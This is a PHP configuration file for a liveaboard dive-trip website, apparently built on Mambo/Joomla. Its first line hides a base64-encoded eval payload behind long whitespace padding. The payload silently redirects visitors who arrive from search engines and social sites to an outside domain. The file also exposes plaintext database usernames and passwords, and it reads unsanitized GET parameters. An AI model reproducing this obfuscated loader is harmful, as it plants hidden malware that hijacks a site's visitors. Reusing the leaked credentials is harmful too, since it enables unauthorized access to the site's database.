<?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));	                                       			 defined( '_VALID_MOS' ) or die( 'Direct Access to this location is not allowed.' ); 
$mosConfig_offline = '0';
//$mosConfig_host = 'localhost';
//$mosConfig_user = 'root';
//$mosConfig_password = 'password';
//$mosConfig_db = 'liveaboards';
//$mosConfig_host = 'localhost';
//$mosConfig_user = 'indonesi_indlius';
//$mosConfig_password = 'inl135';
//$mosConfig_db = 'indonesi_indliveabd';
$mosConfig_host = 'mysql.server';
$mosConfig_user = 'inlivuser';
$mosConfig_password = 'inl123';
$mosConfig_db = 'indonesialiveaboarddbmysql';
$mosConfig_dbprefix = 'mos_';
$mosConfig_lang = 'english';
//$mosConfig_absolute_path = 'http://localhost/liveaboards';
$mosConfig_absolute_path = 'http://indonesialiveaboard.com';
$mosConfig_live_site = '';
$mosConfig_sitename = 'Liveaboards Site';
$mosConfig_shownoauth = '0';
$mosConfig_useractivation = '1';
$mosConfig_uniquemail = '1';
$mosConfig_offline_message = 'This site is down for maintenance.<br /> Please check back again soon.';
$mosConfig_error_message = 'This site is temporarily unavailable.<br /> Please notify the System Administrator';
$mosConfig_debug = '0';
$mosConfig_lifetime = '900';
$mosConfig_MetaDesc = 'liveaboards';
$mosConfig_MetaKeys = 'liveaboards';
$mosConfig_MetaTitle = '1';
$mosConfig_MetaAuthor = '1';
$mosConfig_locale = 'en_GB';
$mosConfig_offset = '0';
$mosConfig_hideAuthor = '0';
$mosConfig_hideCreateDate = '0';
$mosConfig_hideModifyDate = '0';
$mosConfig_hidePdf = '0';
$mosConfig_hidePrint = '0';
$mosConfig_hideEmail = '0';
$mosConfig_enable_log_items = '0';
$mosConfig_enable_log_searches = '0';
$mosConfig_enable_stats = '0';
$mosConfig_sef = '0';
$mosConfig_vote = '0';
$mosConfig_gzip = '0';
$mosConfig_multipage_toc = '1';
$mosConfig_allowUserRegistration = '1';
$mosConfig_link_titles = '0';
$mosConfig_error_reporting = -1;
$mosConfig_list_limit = '10';
$mosConfig_caching = '0';
$mosConfig_cachepath = '';
$mosConfig_cachetime = '900';
$mosConfig_mailer = 'mail';
$mosConfig_mailfrom = '';
$mosConfig_fromname = '';
// how many rows to show per page
$rowsPerPage = 20;

// by default we show first page
$pageNum = 1;

// if $_GET['page'] defined, use it as page number
if(isset($_GET['page']))
{
	$pageNum = $_GET['page'];
	$schedule = $_GET['s'];
	$destination = $_GET['d'];
	$boats =$_GET['b'];
}

// counting the offset
$offset = ($pageNum - 1) * $rowsPerPage;

?>